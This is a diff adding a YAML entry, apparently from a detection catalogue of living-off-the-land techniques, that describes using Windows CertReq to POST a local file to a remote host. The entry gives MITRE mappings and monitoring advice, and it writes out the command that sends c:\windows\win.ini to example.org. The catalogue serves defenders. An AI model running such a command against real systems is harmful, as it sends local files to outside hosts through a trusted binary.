@@ -1,0 +1,22 @@
+- command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
+  description: Use CertReq to save the response of POSTing win.ini to example.org as output.txt in the current directory.
+  killchain:
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+    Exfiltration:
+      - T1048
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Certreq/
+    - https://dtm.uk/certreq/
+  risk: Medium
+  risk_reason: Usage of CertReq, especially to contact remote hosts, should be monitored for the potential tool ingress it allows.
+  fidelity: High
+  fidelity_reason: Usage of CertReq is typically uncommon and provides good opportunities for high-value alerting.
+  tool: CertReq
+  threatactors:
+    N/A:
+      - N/A
